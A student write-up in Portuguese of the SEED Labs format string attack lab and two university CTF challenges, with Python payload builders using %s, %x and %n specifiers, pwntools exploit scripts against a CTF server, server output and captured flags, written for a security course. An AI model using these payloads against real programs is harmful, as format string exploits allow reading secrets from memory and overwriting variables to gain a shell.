# SEED Labs - Format String Attack Lab

## Task 1: Crashing the Program

- build_string.py
```python
#!/usr/bin/python3
import sys

N = 1500
content = ("%s"*N).encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Uma vez que, a função `printf` é chamada (na `myprintf`) sem nenhum argumento opcional, caso o input (string) seja vários `format specifiers`, o seu pointer `va_list` irá avançar para endereços além da sua stack frame. O payload, guardado em `build_string.py`, foi preenchido com vários `%s` como se pode ver acima.
Para cada format specifier `%s` a função `printf` irá tratar o valor obtido (para onde va_list aponta) como um endereço e tenta imprimir valor desse mesmo endereço. O programa irá terminar indevidamente quando a função `printf` tentar imprimir o valor de um endereço inválido (null pointers, endereços que apontam para memória protegida ou endereços virtuais que não estão mapeados na memória física).

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd740
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd668
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

Não é imprimida nenhuma mensagem de retorno, pelo que presupomos que o programa terminou sem retornar devidamente.

## Task 2: Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

Foram necessários **64** (NUM_FORMAT_SPECIFIERS) `format specifiers %x` para `0xaaaaaaaa` ser impresso. `0xaaaaaaaa` (4 bytes) foi colocado no início do payload e o valor, **64**, foi obtido por tentativa e erro. 

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 64

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0xaaaaaaaa
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x\n"*NUM_FORMAT_SPECIFIERS

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd750
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd678
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | ����11223344
server-10.9.0.5 | 1000
server-10.9.0.5 | 8049db5
(60 linhas ocultas)
server-10.9.0.5 | aaaaaaaa
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Task 2.B: Heap Data

Em relação à alínea anterior, os primeiros 4 bytes do input (variável `number`) foram substituídos pelo endereço da _secret message_, `0x080b4008`, que foi obtido através do printout do server - `"The secret message's address:  0x080b4008`. O último format specifier `%x` foi substituído por `%s`, assim a função `printf` trata o valor desse endereço como uma `string`

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 63

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x80b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*NUM_FORMAT_SPECIFIERS + "\n%s"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd750
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd678
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 |@
                 1122334410008049db580e532080e61c0ffffd750ffffd67880e62d480e5000ffffd7188049f7effffd7500648049f4780e53205dc5dcffffd750ffffd75080e97200000000000000000000000000dc0af00080e500080e5000ffffdd388049effffffd7505dc5dc80e5320000ffffde040005dc
server-10.9.0.5 | A secret message
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

## Task 3: Modifying the Server Program’s Memory

### Task 3.A: Change the value to a different value

O endereço da variável `target` é `0x080e5068` e este corresponde aos primeiros 4 bytes do input, à semelhança do que foi feito na Task 2. Por último, foi utilizado o format specifier `%n`, deste modo o número de caracteres impressos pela função `printf` será guardado no endereço indicado, o que permite alterar o valor da variável para outro qualquer. Através do printout do container é possível confirmar que o valor original da variável `target` (0x11223344) foi alerado para `0xed`, que corresponde a 237 em decimal. Isto quer dizer que 237 caracteres foram impressos antes da função `printf` tratar o último format specifier.

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 63

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*NUM_FORMAT_SPECIFIERS + "\n%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd210
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd138
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | h1122334410008049db580e532080e61c0ffffd210ffffd13880e62d480e5000ffffd1d88049f7effffd2100648049f4780e53205dc5dcffffd210ffffd21080e97200000000000000000000000000bade210080e500080e5000ffffd7f88049effffffd2105dc5dc80e5320000ffffd8c40005dc
server-10.9.0.5 | The target variable's value (after):  0x000000ed
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Task 3.B: Change the value to 0x5000

De forma a alterar a variável `target` para um valor específico, neste caso `0x5000` (20480 em decimal), com a técnica da task anterior é necessário utilizar `modificadores de precisão` para controlar o número de dígitos impressos e consequentemente o valor final da variável. Foram aplicados os modificadores de precisão `".330"` e `".16"` aos format specifiers `%x` e assim foram impressos 20480 carateres - 4 (para o endereço 0x080e5068) + 62 * 330 + 16.

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 62

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.330x"*NUM_FORMAT_SPECIFIERS + "%.16x%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | The target variable's value (after):  0x00005001
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd210
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd138
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | (...) 
server-10.9.0.5 | The target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

É possível confimar o valor da variável `target` - "The target variable's value (after):  0x00005000".

# CTF - Semana 7

## Desafio 1

Depois de analisar o código-fonte, verificou-se que a vulnerabilidade (`format string vulnerability`) encontra-se na **linha 27** - `printf(buffer)`, onde o conteúdo do `buffer` (32 bytes) é dado pelo utilizador na linha 25 - `scanf("%32s", &buffer)`. Explorando esta vulnerabilidade é possível ler variáveis da memória, neste caso a variável onde se encontra a `flag`, e imprimi-las no `stdout`. Para isso, utilizou-se a mesma técnica da `task 2` do lab. Neste caso, foi necessário 1 `format specifier %x` para `0xaaaaaaaa` ser impresso e o endereço de memória da variável global `flag`, `0x804c060`, foi descoberto utilizando o _gdb_ tal como é sugerido.
```gdb
gdb-peda$ p &flag 
$1 = (char (*)[40]) 0x804c060 <flag>
```
O payload é constituído pelo endereço de memória da variável onde se encontra a flag, `0x804c060`, e um format specifier `%s`, assim a função `printf` trata o valor desse endereço como uma string. O script fornecido foi alterado para o seguinte:

- exploit_example.py
```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")

#!/usr/bin/python3
import sys

# Initialize the content array
N = 32
content = bytearray(0x0 for i in range(N))

number  = 0x804c060
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%s"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

p.sendline(content)
p.interactive()
```
Com o endereço da flag e com a vulnerabilidade encontrada, é possível ler a flag da memória e imprimi-la no stdout:
```bash
[11/18/22]seed@VM:~/.../Semana7-Desafio1$ python3 exploit_example.py 
[+] Opening connection to ctf-fsi.fe.up.pt on port 4004: Done
[*] Switching to interactive mode
You gave me this: `\xcflag{c861bc5ded72328543e4a577b4fb89c6}

Disqualified!
[*] Got EOF while reading in interactive
```

## Desafio 2

Depois de analisar o código-fonte, verificou-se que a vulnerabilidade (`format string vulnerability`) encontra-se na **linha 14** - `printf(buffer)`, onde o conteúdo do `buffer` (32 bytes) é dado pelo utilizador na linha 12 - `scanf("%32s", &buffer)`. Ao contrário do desafio 1, a flag não está guardada em memória, no entanto, existe a possibilidade do programa dar ao utilizador o acesso à `bash`, consequentemente o acesso à flag. Para desbloquear esse acesso, é necessário alterar o valor da variável global `key` (por defeito 0) para um valor específico, neste caso 0xbeef (48879 em decimal), de modo a tornar a condição testada na linha 17 verdadeira. Para isso, utilizou-se a mesma técnica da `task 3.b` (e `task 3.a`) do lab, mas desta vez com um `width modifier` - "%48871x" - para controlar o número de dígitos impressos e consequentemente o valor final da variável global `key`. Assim foram impressos 48879 carateres - 4 (aleatórios) + 4 (para o endereço 0x0804c034) + 48871. O endereço de memória da variável global `key`, `0x0804c034`, foi descoberto utilizando o _gdb_ tal como é sugerido (à semelhança do desafio 1). O script fornecido foi alterado para o seguinte:

- exploit_example.py
```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4005)

#!/usr/bin/python3
import sys

# Initialize the content array
N = 32
content = bytearray(0x0 for i in range(N))

number  = 0x0804c034
content[0:4]  =  (number).to_bytes(4,byteorder='little')
number  = 0x0804c034
content[4:8]  =  (number).to_bytes(4,byteorder='little')

s = "%48871x%n"

fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

p.sendline(content)
p.interactive()
```
É possível aceder à flag abrindo o ficheiro `flag.txt`:

```bash
[11/18/22]seed@VM:~/.../Semana7-Desafio2$ python3 exploit_example.py 
[+] Opening connection to ctf-fsi.fe.up.pt on port 4005: Done
[*] Switching to interactive mode
There is nothing to see here...You gave me this:4\xc4\xc
804c034Backdoor activated
$ ls
flag.txt
run
$ cat flag.txt
flag{40beb6c9ff8cea392bfd3cf1094b3b8b}
```
